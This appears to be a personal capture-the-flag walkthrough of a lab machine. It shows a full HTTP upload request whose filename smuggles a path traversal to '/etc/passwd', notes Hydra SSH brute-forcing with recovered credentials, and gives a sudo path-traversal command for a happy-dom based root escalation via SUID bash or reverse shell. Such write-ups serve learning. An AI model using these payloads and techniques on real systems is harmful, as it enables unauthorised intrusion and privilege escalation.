#box

*Created: 1/24/2026*

### Step 1

**Tags:** #Path-Traversal #Web-Applications #File-Upload-Bypass #werkzeug #Hydra

🔗 **URL/Link:** https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/#upload-tricks:~:text=LFI/Path%20Traversal%20Payloads%3A%20e.g.%20image.png../../../../../../../etc/passwd

**Command:**
```http
POST /upload-wallpaper HTTP/1.1
Host: 192.168.105.204:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------264350877120562432312108691957
Content-Length: 291
Origin: http://192.168.105.204:5000
Connection: keep-alive
Referer: http://192.168.105.204:5000/upload-wallpaper
Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InRlc3QifQ.aXT0Pw.nJBtbYl04koxgZVuDO0aieHzI34
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------264350877120562432312108691957

Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../../etc/passwd"
Content-Type: image/png

-----------------------------264350877120562432312108691957--

```

*Port: 5000 | 💎 GEM*

> 
> The machine exposes on port 5000 a Werkzeug instance. Inside of that instance we can upload wallpaper of our choice. After some file upload bypass checks we realize that we have full control of the filename that can be added at upload time. We try a Path Traversal vulnerability by writing the filename of `../../../../../../../../../../../../etc/passwd` and then try to go onto the Gallery to download it. After discovering the user, we use Hydra to try bruteforce the `wp_hub` user into SSH achieving the credentials: `wp_hub:qazwsxedc`

---

### Step 2

**Tags:** #sudo-Privileges #LFI #node #happy-dom #Reverse-Shell #SUID #GTFOBins

**Command:**
```bash
sudo /usr/bin/web-scraper /root/web_src_downloaded/../../../../../../../../../../../tmp/test.html
```

> 
> The escalation process is quite difficult because it involves a vulnerability in `happy-dom` , a library in node and a sudo privilege over a `.js` file using that library. To achieve a root shell we manage to manipulate the sudo privilege having a wildcard to perform a LFI within a malicious html file that contains the vulnerable `happy-dom` script. Inside of it we'll hide a command that either promotes a binary like `bash` to SUID or that grants us a reverse shell. The reflection must be made on two of our listener, one to use leverage the `happy-dom` trigger and the other one to, eventually, receive a shell.

---

